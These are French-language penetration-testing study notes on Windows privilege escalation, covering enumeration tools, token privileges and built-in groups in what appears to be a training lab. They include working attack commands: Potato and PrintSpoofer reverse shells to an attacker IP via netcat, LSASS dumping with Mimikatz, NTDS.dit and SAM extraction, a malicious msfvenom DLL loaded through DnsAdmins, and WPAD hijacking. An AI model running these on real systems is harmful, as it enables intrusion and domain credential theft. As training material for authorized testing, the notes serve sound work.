# Useful Tools

Voici une liste compacte d'outils utiles pour l'énumération et la recherche de pistes d'élévation de privilèges sur des hôtes Windows. Pour chaque outil : brève description + commande / usage typique.

## Outils d'énumération & post-exploitation
- **Seatbelt** — projet C# pour checks locaux variés (audit sécurité).  
  Usage : `Seatbelt.exe all` (ou exécuter avec `-output` pour sauvegarder).

- **winPEAS** — script (batch/PowerShell) qui recherche un grand nombre de vecteurs d'élévation (misconfig, services, permissions, scheduled tasks, credentials).  
  Usage : `winPEAS.bat` ou `PowerShell -ExecutionPolicy Bypass -File winPEAS.ps1`.

- **PowerUp** — script PowerShell (PowerUp.ps1) spécialisé dans les misconfig common (services vulnérables, DLL hijack, ACLs, scheduled tasks).  
  Usage : `Import-Module .\PowerUp.ps1; Invoke-AllChecks`.

- **SharpUp** — équivalent C#/binaire de PowerUp (utile si `powershell` limité).  
  Usage : exécuter `SharpUp.exe` et récupérer la sortie.

- **JAWS** — script PowerShell long-format (compatible PSv2) pour énumération complète.  
  Usage : `powershell -exec bypass -file .\jaws.ps1`.

## Récupération/gestion de credentials
- **LaZagne** — récupère mots de passe stockés localement (navigateurs, DB, applications, etc.).  
  Usage : `laZagne.exe all`.

- **SessionGopher** — récupère & décrypte sessions sauvegardées (PuTTY, WinSCP, RDP, …).  
  Usage : `SessionGopher.ps1` (PowerShell).

## Matching KBs / exploit suggestions
- **Watson** — .NET tool pour lister les KB manquants et suggérer exploits liés.  
  Usage : `watson.exe`.

- **Windows Exploit Suggester - Next Generation (WES-NG)** — prend la sortie de `systeminfo` et propose vulnérabilités / PoC connus.  
  Workflow : `systeminfo > sysinfo.txt` → analyser avec WES-NG.


## Outils Sysinternals (très pratiques)
- **AccessChk** — lister droits & permissions sur fichiers/keys/services.  
  Usage : `accesschk.exe -uws Users D:\some\file` ou `accesschk -accepteula -uwqv -s *`.

- **PsService / PsExec / PsList / PsInfo** — informations services/process, exécution distante (attention, PsExec peut laisser des artefacts).  
  Usage : `PsService.exe \\target query` ; `PsExec.exe -s -i cmd.exe` (si autorisé).

- **PipeList** — lister named pipes ouvertes (utile pour credential theft/exploits IPC).  
  Usage : `PipeList.exe`.

## Recommandations pratiques
- Toujours **compiler depuis la source** quand possible (évite détections/flags malveillants/prebuilt).  
- Exécuter d’abord en mode *lecture* (énumération) ; éviter d’exécuter exploits destructifs sur des systèmes de production.  
- Collecter la sortie dans des fichiers pour tri/post-analyse : `> results.txt`.  
- Si PowerShell restreint : utiliser versions encodées ou modules .NET/compiled (`SharpUp`, Seatbelt`).

---

# Getting the Lay of the Land

# Situational Awareness

## Objectif  
Lorsqu’on arrive sur un système (Windows ou Linux), il est essentiel de **comprendre l’environnement** avant toute action :  
- Quelles interfaces réseau ?  
- Quelles protections actives ?  
- Quelles restrictions applicatives ?  

Cette phase oriente les prochaines étapes (escalade, mouvements latéraux, ou persistance).

## Network Enumeration

### Vérifier interfaces, IP, DNS
Commande :
`ipconfig /all`

→ Donne :  
- Nom d’hôte / suffixe DNS  
- Interfaces réseau  
- IP / Masque / Gateway  
- Serveurs DNS  
- DHCP / DNS Suffix / WINS

> Si plusieurs interfaces (dual-homed host) → peut ouvrir une passerelle vers un autre réseau interne.

### Voir les connexions locales
Commande :
`arp -a`

→ Montre les hôtes récemment contactés (utile pour repérer machines d’administration via RDP/WinRM).

### Voir la table de routage
Commande :
`route print`

→ Indique :
- Routes actives (IPv4/IPv6)  
- Gateways  
- Interfaces et priorités  
> Peut révéler des sous-réseaux internes accessibles via ce poste.

## Protection & Security Enumeration

### Vérifier la présence d’un antivirus / EDR
Commande PowerShell :
`Get-MpComputerStatus`

→ Donne :
- Statut du service AV/AS  
- Versions du moteur & signatures  
- Modules actifs : *RealTimeProtectionEnabled*, *IoavProtectionEnabled*, etc.

> Permet d’adapter les outils : certains exploits / scripts peuvent être bloqués par l’EDR.

### Lister les règles AppLocker
Commande PowerShell :
`Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections`

→ Montre :
- Règles *Default Rules* (Program Files, Windows, etc.)  
- Qui peut exécuter quoi (groupes Everyone, Administrators, etc.)  
> Permet d’identifier si `cmd.exe`, `powershell.exe`, ou certains scripts sont bloqués.

### Tester une règle AppLocker spécifique
Commande PowerShell :
`Get-AppLockerPolicy -Local | Test-AppLockerPolicy -path C:\Windows\System32\cmd.exe -User Everyone`

→ Renvoie *Allowed* ou *Denied* pour l’exécution du binaire spécifié.  
> Pratique pour tester si un contournement AppLocker sera nécessaire.

## Conseils pratiques
- Sauvegarder la sortie des commandes (`> enum.txt`) pour l’analyse hors ligne.  
- Identifier les domaines, contrôleurs AD, segments réseau adjacents.  
- Vérifier la configuration d’AV/EDR avant d’utiliser des outils comme PowerUp/SharpUp.  
- Adapter les scripts à l’environnement (modifier signatures, noms, chemins).  

---


# Initial Enumeration

## Objectif
Après avoir obtenu un shell basique sur un hôte Windows, le but est de **collecter un maximum d’informations** sur :
- le système et sa version,  
- les utilisateurs/groupes,  
- les services et logiciels,  
- les protections et chemins d’escalade possibles.  

Une bonne énumération manuelle = escalade plus rapide et moins risquée.

## Infos système

### Version et patchs
`systeminfo`  
→ Donne OS, build, patchs (KB), uptime, matériel, domaine, etc.  
> Si peu de hotfixes récents → possible vulnérabilité kernel/exploit public.

### Liste des correctifs
`wmic qfe`  
ou  
`powershell Get-HotFix | ft -AutoSize`

### Infos matérielles et programmes
`wmic product get name`  
ou  
`powershell Get-WmiObject -Class Win32_Product | select Name, Version`  
> Identifier logiciels vulnérables (Java, SQL Server, FileZilla, etc.).

## Services & processus

### Lister processus et services associés
`tasklist /svc`  
→ Identifier services privilégiés ou inhabituels (ex : `FileZilla Server.exe`, `IISADMIN`, etc.).  
> Chercher ceux exécutés comme `SYSTEM` ou `Administrator`.

### Voir ports ouverts / services exposés
`netstat -ano`  
→ Permet de repérer des services internes exploitables.

## Variables & configuration

### Lister variables d’environnement
`set`  
→ Vérifier `PATH`, `HOMEDRIVE`, `USERPROFILE`, etc.  
> Si un dossier *writable* est avant `C:\Windows\System32` → possible DLL hijacking.

## Utilisateurs & groupes

### Utilisateur actuel
`echo %USERNAME%`  
ou  
`whoami`

### Privilèges de l’utilisateur
`whoami /priv`  
→ Repérer privilèges sensibles (`SeImpersonatePrivilege`, etc.).

### Groupes de l’utilisateur
`whoami /groups`  
→ Vérifier appartenance à `Administrators`, `Remote Desktop Users`, etc.

### Utilisateurs connectés
`query user`  
→ Voir sessions actives (ex : `administrator` connecté via RDP).

### Lister tous les utilisateurs
`net user`

### Lister tous les groupes
`net localgroup`

### Détails d’un groupe (ex : Administrators)
`net localgroup administrators`

## Politique de mots de passe
`net accounts`  
→ Donne longueur min, âge max, verrouillage, etc.  
> Faible complexité = brute force possible.

## Points clés à surveiller
- Services tiers tournant en SYSTEM.  
- Logiciels obsolètes (Java, SQL, etc.).  
- Variables PATH modifiées.  
- Comptes admin ou “helpdesk” réutilisés.  
- Politiques faibles (mot de passe / verrous).

---

# Communication with Processes

## Objectif  
Comprendre comment les processus communiquent permet souvent d’identifier des **vecteurs d’escalade de privilèges**, via :
- Services réseau exposés localement (ports internes, API non sécurisées)  
- Named Pipes mal configurées (droits en écriture pour “Everyone”)  
- Tokens ou communications inter-process mal protégées  

## Access Tokens  
Chaque processus Windows possède un **token d’accès** qui définit :
- L’identité de l’utilisateur  
- Ses privilèges (`SeImpersonatePrivilege`, `SeDebugPrivilege`, etc.)  

Ces tokens peuvent être détournés pour obtenir des privilèges SYSTEM via des exploits comme **Juicy/Rogue Potato**.

## Network Services  

### Lister connexions et ports actifs  
`netstat -ano`  
→ Montre tous les ports TCP/UDP, états, et PID associés.  
Chercher :
- Ports locaux (`127.0.0.1` / `::1`) **non exposés** sur l’interface publique.  
- Services internes comme `FileZilla`, `Splunk`, `RabbitMQ`, `IIS`, etc.  
> Ces services sont souvent mal sécurisés car jugés “non exposés au réseau”.

Exemples classiques :  
- `127.0.0.1:14147` → interface admin FileZilla (extraction de mots de passe possible).  
- `Splunk Universal Forwarder` → exécution de code sans auth (ancien bug).  
- `Erlang Port 25672` (RabbitMQ, CouchDB, etc.) → cookies faibles (`rabbit`) exposés.  

## Named Pipes  

### Principe  
Les **Named Pipes** sont des canaux de communication entre processus :  
- `\\.\pipe\<nom>`  
- Peuvent être **half-duplex** (écriture seule) ou **duplex** (lecture/écriture).  
> Cobalt Strike les utilise massivement (ex : `\\.\pipe\msagent_12`).

### Lister les Named Pipes  
`pipelist.exe /accepteula`  
ou  
`powershell gci \\.\pipe\`  

→ Montre les pipes actives (ex : `lsass`, `spoolss`, `vmware-usbarbpipe`, etc.).  
> Chercher les pipes non standards ou en lien avec des services tiers.

### Vérifier les permissions sur une pipe  
`accesschk.exe /accepteula \\.\pipe\<nom> -v`  

Exemple :  
`accesschk.exe /accepteula \\.\pipe\lsass -v`  
→ Seuls les administrateurs ont accès complet.  
> Si “Everyone” a `WRITE` ou `FILE_ALL_ACCESS`, c’est exploitable.

### Rechercher des pipes vulnérables  
`accesschk.exe -accepteula -w \pipe\* -v`  
→ Lister les pipes accessibles en écriture.  
Exemple :  

```
RW Everyone FILE_ALL_ACCESS
```
Cela signifie que **tous les utilisateurs** peuvent écrire dedans → escalade SYSTEM possible. 

## Points clés à retenir
- Les **ports internes** (loopback) sont de bons candidats à exploiter (admin interfaces, API locales).
- Les **Named Pipes** sont une surface d’attaque souvent négligée.
- Utiliser **AccessChk** pour vérifier les permissions (`RW Everyone`). 
- Toujours recouper PID ↔ Processus via `tasklist /svc` ou `Get-Process`. 
- Si un service tourne avec `SeImpersonatePrivilege` → testez les *Potato exploits*.

--- 
# Windows User Privileges
---

# Windows Privileges Overview

## Définition  
Les **privilèges Windows** sont des droits système accordés à un compte pour exécuter certaines actions :  
- gérer des services,  
- charger des drivers,  
- déboguer des programmes,  
- accéder à des fichiers protégés, etc.  

Ils sont différents des **droits d’accès** (permissions sur objets) et sont stockés dans le **token d’accès** de chaque utilisateur.

> Les privilèges peuvent être **désactivés** par défaut et activés uniquement dans une session **élevée (Admin)**.

## Processus d’autorisation  
Lorsqu’un utilisateur tente d’accéder à une ressource :
1. Windows lit le **token** (User SID, Group SIDs, Privileges, etc.).  
2. Compare ces infos avec les **ACEs** de l’objet (liste des droits).  
3. Autorise ou bloque l’action.

L’exploitation consiste à **abuser de privilèges ou groupes** pour détourner ce processus.

## 👥 Groupes puissants (à surveiller)
| Groupe | Description / Risques |
|--------|------------------------|
| **Administrators** | Accès total au système |
| **Domain Admins / Enterprise Admins** | Contrôle total AD |
| **Server Operators** | Gèrent services, fichiers, partages SMB |
| **Backup Operators** | Peuvent copier SAM/NTDS, lire registre distant |
| **Print Operators** | Peuvent charger un driver malveillant |
| **Hyper-V Administrators** | Accès aux VMs (peut inclure DCs) |
| **Account Operators** | Modifient comptes non protégés |
| **Remote Desktop Users** | Accès RDP (souvent élargi en pratique) |
| **Remote Management Users** | Accès PowerShell Remoting |
| **Schema Admins** | Modifient le schéma AD |
| **DNS Admins** | Peuvent charger DLLs (persistance) |

## Principaux droits (User Rights Assignment)

| Constante | Nom | Groupes | Description |
|------------|------|----------|-------------|
| **SeNetworkLogonRight** | Accès via réseau | Admins, Users | Connexion via SMB, NetBIOS… |
| **SeRemoteInteractiveLogonRight** | Connexion RDP | Admins, RDP Users | Connexion via RDP |
| **SeBackupPrivilege** | Sauvegarder fichiers | Admins | Contourne ACL pour backup |
| **SeRestorePrivilege** | Restaurer fichiers | Admins | Restaure fichiers protégés |
| **SeTakeOwnershipPrivilege** | Prendre possession d’objets | Admins | Changer propriétaire d’un fichier |
| **SeDebugPrivilege** | Debug de processus | Admins | Attacher à n’importe quel processus |
| **SeImpersonatePrivilege** | Usurper un utilisateur | Admins, Services | Base des attaques Potato |
| **SeLoadDriverPrivilege** | Charger drivers | Admins | Code kernel exécutable |
| **SeTcbPrivilege** | Agir comme OS | Admins, Services | Impersonation complète (haut risque) |


## Ressources
- [Script pour activer les privilèges](https://www.powershellgallery.com/packages/PoshPrivilege/0.3.0.0/Content/Scripts%5CEnable-Privilege.ps1)
- [Script pour activer les privilèges](https://www.leeholmes.com/adjusting-token-privileges-in-powershell/)

---

# SeImpersonate & SeAssignPrimaryToken

**Ce que c’est**  
- Les tokens de processus décrivent le contexte de sécurité (qui exécute quoi).  
- `SeImpersonatePrivilege` permet à un processus d'« emprunter » (impersonate) le token d'un autre utilisateur après authentification.  
- `SeAssignPrimaryTokenPrivilege` permet de remplacer le token principal d'un processus (plus rare).  
- Ces privilèges sont souvent assignés à des services et sont la base des attaques *Potato* (Juicy/Rogue/PrintSpoofer) pour obtenir `NT AUTHORITY\SYSTEM`.

**Pourquoi ça nous intéresse**  
- Si un compte/service a `SeImpersonate` (même s’il n’est pas admin), on peut souvent forcer la création d’un processus SYSTEM via des outils publics.  
- Fréquent après RCE via web/app (webshell, `xp_cmdshell`, etc.) : vérifier immédiatement.

**Vérifier en premier**  
- Exécuter : `whoami /priv`  
- Chercher `SeImpersonatePrivilege` ou `SeAssignPrimaryTokenPrivilege` en état `Enabled`.

**Flux d’exploitation (ex. JuicyPotato)**  
1. obtenir RCE (ex. via `xp_cmdshell` ou webshell).  
2. uploader `JuicyPotato.exe` et `nc.exe`.  
3. lancer un listener local : `nc -lnvp 8443`  
4. exécuter JuicyPotato :  
   `JuicyPotato.exe -l 53375 -p C:\Windows\System32\cmd.exe -a "/c C:\tools\nc.exe 10.10.14.3 8443 -e cmd.exe" -t *`  
5. si ça marche → shell `nt authority\system` sur votre listener.

**Alternatives (versions récentes)**
- `JuicyPotato` fonctionne mal/plus sur Win10 1809+ / Server 2019.  
- Utiliser `PrintSpoofer` ou `RoguePotato` (fonctionnent sur builds plus récentes) : exemple :  
  `PrintSpoofer.exe -c "C:\tools\nc.exe 10.10.14.3 8443 -e cmd"`  
  → listener `nc -lnvp 8443` pour catcher la session SYSTEM.

### Ressources
- [JuicyPotato](https://github.com/ohpe/juicy-potato)
- [PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
- [RoguePotato](https://github.com/antonioCoco/RoguePotato)

---

# SeDebugPrivilege

**C’est quoi ?**  
- `SeDebugPrivilege` permet d’ouvrir/inspecter n’importe quel processus pour le débogage.  
- Par défaut réservé aux administrateurs — parfois donné à des développeurs/service accounts.  
- Très puissant : accès à la mémoire système (ex. LSASS) → récupération de credentials ou RCE en SYSTEM.

**Vérifier rapidement**  
- `whoami /priv` → chercher `SeDebugPrivilege` (Disabled = présent mais non actif dans le token actuel).

**Exploitation courante : dump LSASS → extraire mots de passe**
1. Dumper la mémoire de LSASS :  
   `procdump.exe -accepteula -ma lsass.exe lsass.dmp`
2. Récupérer mots de passe NTLM/cleartext :  
   Dans Mimikatz :  
   `sekurlsa::minidump lsass.dmp`  
   `sekurlsa::logonPasswords`

*(si pas de binaires autorisés : via RDP → Task Manager → Details → Create dump file → télécharger et analyser localement)*

**Exploitation alternative : utiliser la capacité de debugging pour obtenir RCE SYSTEM**  
- PoC/outil courant : `psgetsystem` / script PowerShell qui utilise le parent PID SYSTEM.  
- Usage générique du PoC :  
  `[MyProcess]::CreateProcessFromParent(<system_pid>, <command_to_execute>, "")`  
- Exemple pratique : récupérer PID d’un process SYSTEM (`tasklist` ou `Get-Process`) puis lancer la commande pour créer un child process héritant du token SYSTEM.

**Autres outils / méthodes**
- Plusieurs PoC publics popent un shell SYSTEM quand `SeDebugPrivilege` est présent.  
- On peut aussi injecter/modifier un service/process pour exécuter un binaire en SYSTEM.

**Précautions**
- Actions très noisy et détectables (EDR/AV).  
- Dumping LSASS contient beaucoup de secrets — manipuler avec prudence et effacer traces.  
- Ne pas tester sur des environnements de production sans autorisation.

**Checklist rapide**
- `whoami /priv` → confirme la présence.  
- `tasklist` / `Get-Process` → choisir cible SYSTEM (ex. `winlogon.exe`, `lsass.exe`).  
- Si possible : `procdump` → Mimikatz pour récupérer credentials.  
- Sinon : PoC CreateProcessFromParent / psgetsystem / autres → obtenir shell SYSTEM.

### Ressources 
- [psgetsystem](https://github.com/decoder-it/psgetsystem)

--- 

# SeTakeOwnershipPrivilege

`SeTakeOwnershipPrivilege` permet à un utilisateur de **prendre possession** d’un objet sécurisable (fichiers NTFS, clés de registre, services, objets AD, imprimantes, etc.). 
Concrètement il donne le droit `WRITE_OWNER` sur l’objet — l’utilisateur peut en changer le propriétaire et ensuite modifier les ACL pour se donner l’accès. 
Par défaut attribué aux administrateurs ; rare pour un utilisateur standard, mais possible pour des comptes de services (ex : comptes de sauvegarde).

> Modifier la propriété/ACL d’objets sensibles peut interrompre des services ou casser des applis. Toujours obtenir l’accord client et documenter/annuler les changements si possible.

### Vérifier si on a le droit
- Voir les privilèges actuels : `whoami /priv`  
  Chercher `SeTakeOwnershipPrivilege` (si `Disabled` → présent mais non activé dans le token actuel).

### Activer le privilège dans le token courant
Windows n’active pas automatiquement tous les privilèges listés dans le token. 
On peut utiliser des scripts PowerShell publics pour activer les privilèges du token, par ex. :  
- Importer un module d’activation : `Import-Module .\Enable-Privilege.ps1`  
- Activer les privilèges : `.\EnableAllTokenPrivs.ps1`  
- Re-vérifier : `whoami /priv` (devrait montrer `SeTakeOwnershipPrivilege` = `Enabled`)

### Flux d’exploitation typique (lecture d’un fichier protégé)

1. **Choisir la cible** (ex. `C:\Department Shares\Private\IT\cred.txt`)  
   - Voir propriétaire / métadonnées :  
     `Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | Select Fullname,LastWriteTime,Attributes,@{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }}`

2. **Vérifier l’ownership du répertoire** (optionnel) :  
   `cmd /c dir /q 'C:\Department Shares\Private\IT'`

3. **Prendre possession du fichier** :  
   `takeown /f 'C:\Department Shares\Private\IT\cred.txt'`  
   → message `SUCCESS: ... now owned by user "DOMAIN\you"`

4. **(Si nécessaire) modifier l’ACL pour se donner l’accès** :  
   `icacls 'C:\Department Shares\Private\IT\cred.txt' /grant youruser:F`  
   → `processed file... Successfully processed 1 files`

5. **Lire le fichier** :  
   `Get-Content 'C:\Department Shares\Private\IT\cred.txt'`  
   ou `cat 'C:\Department Shares\Private\IT\cred.txt'`

6. **Nettoyage / restitution** : documenter et, si possible, remettre propriétaire/ACL d’origine.

### Quand utiliser ce privilège ?
- Quand d’autres vecteurs sont bloqués (ex. pas d’exécution d’exploits, pas d’accès direct) et que l’accès à un fichier précis peut fournir credentials/clefs/secret nécessaires pour l’escalade.
- Exemples de cibles intéressantes : fichiers de config web (`web.config`), secrets (`cred*`, `password*`), bases KeePass (`.kdbx`), fichiers système (`%WINDIR%\system32\config\*`), fichiers de sauvegarde, clés SSH, etc.

### Exemples de fichiers souvent visés
- `c:\inetpub\wwwroot\web.config`  
- `%WINDIR%\system32\config\software.sav`  
- `%WINDIR%\repair\sam`  
- Fichiers `*.kdbx`, `creds.*`, `pass.*`, `*.pem` ou scripts contenant des secrets

---

# Windows Group Privileges

---

# Windows Built-in Groups

Comme indiqué dans la section *Windows Privileges Overview*, les serveurs Windows (et en particulier les Domain Controllers) incluent plusieurs groupes intégrés fournis avec le système ou ajoutés lors de l'installation du rôle Active Directory. 
Beaucoup de ces groupes confèrent des privilèges particuliers à leurs membres ; certains de ces privilèges peuvent être exploités pour une élévation de privilèges sur un serveur ou un DC. 
Il est important de comprendre l'impact de l'appartenance à chacun de ces groupes et d'inclure la liste des membres lors d'un audit.

Pour nos besoins, nous nous concentrons sur les groupes suivants :

- `Backup Operators`  
- `Event Log Readers`  
- `DnsAdmins`  
- `Hyper-V Administrators`  
- `Print Operators`  
- `Server Operators`
  
## Backup Operators

Après avoir obtenu un accès, utilisez `whoami /groups` pour vérifier vos appartenances aux groupes. L'appartenance à `Backup Operators` donne les privilèges `SeBackupPrivilege` et `SeRestorePrivilege`. Le privilège `SeBackupPrivilege` permet d'énumérer et de copier des fichiers même sans ACE explicite pour l'utilisateur actif, mais il faut utiliser les mécanismes de sauvegarde (par ex. `FILE_FLAG_BACKUP_SEMANTICS`) plutôt que la commande `copy` classique.

### Import helper modules
Pour utiliser un PoC qui exploite ces privilèges, importez les modules PowerShell d'assistance :
`Import-Module .\SeBackupPrivilegeUtils.dll`  
`Import-Module .\SeBackupPrivilegeCmdLets.dll`

### Verify privilege
Vérifiez l'état du privilège :
`whoami /priv`  
ou
`Get-SeBackupPrivilege`

Si `SeBackupPrivilege` est `Disabled`, activez-le :
`Set-SeBackupPrivilege`  
Puis confirmez :
`Get-SeBackupPrivilege`  
`whoami /priv`

Une fois activé, il devient possible de lire ou copier des fichiers sans ACL explicite.

### Copy a protected file
Exemple : un fichier protégé que l'on ne peut pas lire avec `cat` :
`cat 'C:\Confidential\2021 Contract.txt'` → accès refusé

Avec l'outil adapté :
`Copy-FileSeBackupPrivilege 'C:\Confidential\2021 Contract.txt' .\Contract.txt`  
Puis :
`cat .\Contract.txt` → affiche le contenu copié

## Attacking a Domain Controller — Copying `NTDS.dit`

Les `Backup Operators` peuvent se connecter localement sur un DC et créer des shadow copies (VSS) pour accéder à des fichiers verrouillés comme `NTDS.dit`.

### Create and expose a shadow copy with DiskShadow
Exécutez `diskshadow.exe` et la séquence suivante :
`set verbose on`  
`set metadata C:\Windows\Temp\meta.cab`  
`set context clientaccessible`  
`set context persistent`  
`begin backup`  
`add volume C: alias cdrive`  
`create`  
`expose %cdrive% E:`  
`end backup`  
`exit`

Listez le lecteur exposé :
`dir E:`

### Copy `ntds.dit`
Copiez le fichier verrouillé via la cmdlet de backup :
`Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit`

## Backing up SAM and SYSTEM hives

Sauvegardez les ruches de registre pour extraction hors-ligne :
`reg save HKLM\SYSTEM SYSTEM.SAV`  
`reg save HKLM\SAM SAM.SAV`

Ces fichiers, associés à `ntds.dit`, permettent d'extraire les hachages hors ligne.

## Extracting credentials from `ntds.dit`

Avec DSInternals (PowerShell) :
`Import-Module .\DSInternals.psd1`  
`$key = Get-BootKey -SystemHivePath .\SYSTEM`  
`Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=Users,DC=inlanefreight,DC=local' -DBPath .\ntds.dit -BootKey $key`

Cela retournera les métadonnées et le `NTHash` du compte.

### Using `secretsdump.py` (Impacket) offline
Exemple :
`secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL`

La commande retournera les hachages des comptes du domaine pour une utilisation en pass-the-hash ou en cassage hors-ligne.

## Robocopy alternative

L'utilitaire intégré `robocopy` peut aussi copier en mode sauvegarde (`/B`) :
`robocopy /B E:\Windows\NTDS .\ntds ntds.dit`

Cela permet de copier des fichiers verrouillés depuis la shadow copy sans outils externes.

## Notes & cautions

- Si un ACE explicite de type *deny* existe pour l'utilisateur ou un groupe auquel il appartient, cela peut empêcher l'accès même avec `SeBackupPrivilege`.  
- Extraire `ntds.dit` et les ruches de registre est bruyant et potentiellement destructeur ; obtenir l'autorisation et documenter toutes les modifications.  
- Dans le rapport, fournissez la liste des membres des groupes concernés et des recommandations pour réduire les appartenances inutiles.

---

# Event Log Readers

Les entrées d'audit (par ex. la création de processus et la ligne de commande associée) sont très précieuses pour la défense : elles permettent de retracer les commandes exécutées sur un poste et d'alimenter un SIEM ou un moteur de recherche (ElasticSearch, etc.). Si l'audit de la création de processus et des lignes de commande est activé, les informations se retrouvent dans le journal de sécurité Windows sous l'ID d'événement `4688`.

Les attaquants exécutent souvent des commandes reconnaissables après un accès initial (`tasklist`, `ipconfig`, `systeminfo`, `dir`, `net view`, `net use`, etc.). La présence de ces événements dans les logs permet de détecter et d'alerter sur des comportements suspects. Certaines organisations vont plus loin en bloquant l'exécution de commandes via AppLocker.

Administrateurs et utilisateurs placés dans le groupe `Event Log Readers` peuvent lire certains journaux d'événements locaux sans être administrateurs (utile pour déléguer la consultation des logs sans donner de droits d'admin).

## Confirming Group Membership

Vérifiez les membres du groupe local :
`net localgroup "Event Log Readers"`

Exemple de sortie :
`logger` (membre listé)

## Searching Security Logs with `wevtutil`

Depuis la ligne de commande, il est possible d'interroger le journal de sécurité. Exemple pour trouver des lignes de commande contenant `/user` (attention aux mots de passe en clair dans les commandes) :
`wevtutil qe Security /rd:true /f:text | Select-String "/user"`

Vous pouvez aussi préciser des informations d'authentification pour `wevtutil` :
`wevtutil qe Security /rd:true /f:text /r:share01 /u:julie.clay /p:Welcome1 | findstr "/user"`

## Searching Security Logs with `Get-WinEvent`

Avec PowerShell, filtrez les événements 4688 et extrayez la ligne de commande (ici on cherche `/user` dans la ligne de commande) :
`Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}`

**Important** : la lecture du journal `Security` via `Get-WinEvent` nécessite souvent des droits administrateur ou des permissions spécifiques sur la clé de registre `HKLM\System\CurrentControlSet\Services\Eventlog\Security`. L'appartenance seule au groupe `Event Log Readers` n'est pas toujours suffisante pour interroger ce journal.

## Other Useful Logs

- Le journal *PowerShell Operational* peut contenir des informations sensibles (script block logging, module logging) et **est souvent accessible aux utilisateurs non-privés** — il vaut donc la peine d’être parcouru.
- Vérifiez aussi les journaux d’application et système selon la configuration d’audit locale.

## Remarques pratiques

- Recherchez en priorité les événements 4688 (process creation) et les valeurs `CommandLine` si l'audit est activé.  
- Recherchez les occurrences de mots-clés indiquant des credentials en clair (`/user:`, `-Password`, `-p`, etc.).  
- Documentez toute découverte (commande complète, timestamp, PID, utilisateur) dans le rapport — ces logs constituent des preuves et sont utiles pour la remédiation.

---

# DnsAdmins

Les membres du groupe `DnsAdmins` ont accès à la configuration du service DNS du domaine. Ce service, exécuté sous le compte `NT AUTHORITY\SYSTEM`, peut charger des **plugins DLL personnalisés** sans vérification de chemin via la clé de registre `ServerLevelPluginDll`. 
Cela signifie qu’un membre du groupe peut **charger une DLL malveillante** et l’exécuter avec les privilèges SYSTEM, permettant ainsi une **élévation de privilèges sur un Domain Controller**.

## Leveraging DnsAdmins Access

### Generating a Malicious DLL

On peut générer une DLL malveillante qui, par exemple, ajoute un utilisateur au groupe `Domain Admins` :
`msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll`

### Starting Local HTTP Server

On démarre un petit serveur pour héberger la DLL :
`python3 -m http.server 7777`

### Downloading File to Target

On télécharge ensuite la DLL sur la machine cible :
`wget "http://10.10.14.3:7777/adduser.dll" -outfile "adduser.dll"`

## Loading the DLL

### As Non-Privileged User

Un utilisateur standard ne pourra pas charger la DLL :
`dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll`  
→ `ERROR_ACCESS_DENIED`

### As Member of DnsAdmins

Confirmez d’abord que l’utilisateur est membre du groupe :
`Get-ADGroupMember -Identity DnsAdmins`

Puis chargez la DLL :
`dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll`  
→ `Command completed successfully.`

La clé de registre `ServerLevelPluginDll` est alors mise à jour.  
La DLL sera chargée **lors du prochain redémarrage du service DNS**.

## Restarting the DNS Service

Un membre de `DnsAdmins` ne peut pas forcément redémarrer le service, mais si les permissions le permettent, on peut vérifier cela :

### Finding User SID
`wmic useraccount where name="netadm" get sid`

### Checking Permissions on DNS Service
`sc.exe sdshow DNS`  
Si le SID de l’utilisateur a les droits `RPWP`, il peut **stopper et démarrer** le service.

### Stopping and Starting DNS
`sc stop dns`  
`sc start dns`

Si l’attaque réussit, la DLL s’exécute et ajoute l’utilisateur au groupe Domain Admins.

### Confirming Group Membership
`net group "Domain Admins" /dom`  
→ l’utilisateur `netadm` est maintenant membre du groupe.

## Cleaning Up

**Attention :** modifier la configuration DNS d’un Domain Controller est une action à fort risque. Elle doit toujours être effectuée avec l’accord explicite du client.

### Confirming Registry Key Added
`reg query \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters`

La valeur `ServerLevelPluginDll` doit pointer vers la DLL malveillante.

### Deleting Registry Key
`reg delete \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters /v ServerLevelPluginDll`

### Starting the DNS Service Again
`sc.exe start dns`

### Checking Service Status
`sc query dns`  
→ L’état doit être `RUNNING`.

Une fois le service redémarré sans la DLL, le fonctionnement DNS redevient normal.

## Using `mimilib.dll`

Une autre méthode consiste à utiliser `mimilib.dll` (de Mimikatz) pour exécuter du code à chaque requête DNS.  
Il suffit de modifier la fonction `kdns_DnsPluginQuery()` pour exécuter une commande (par ex. un reverse shell) avant compilation.

## Creating a WPAD Record

Une autre exploitation du groupe `DnsAdmins` consiste à créer un **enregistrement DNS WPAD** afin de détourner le trafic réseau via un proxy contrôlé par l’attaquant.  
Par défaut, WPAD et ISATAP sont bloqués dans la *Global Query Block List*. En désactivant ce blocage, l’attaque devient possible.

### Disabling the Global Query Block List
`Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.inlanefreight.local`

### Adding a WPAD Record
`Add-DnsServerResourceRecordA -Name wpad -ZoneName inlanefreight.local -ComputerName dc01.inlanefreight.local -IPv4Address 10.10.14.3`

Ainsi, toutes les machines cherchant à découvrir un proxy via WPAD pointeront vers la machine de l’attaquant, permettant la capture ou la redirection de trafic (par ex. avec `Responder` ou `Inveigh`).

## Points clés

- Le groupe `DnsAdmins` permet de **charger une DLL exécutée en SYSTEM** via `ServerLevelPluginDll`.  
- Il est également possible d’**exploiter les enregistrements DNS** (comme WPAD) pour des attaques réseau.  
- Toute manipulation du service DNS doit être faite avec précaution — elle peut **impacter tout l’environnement AD**.

---

# Hyper-V Administrators

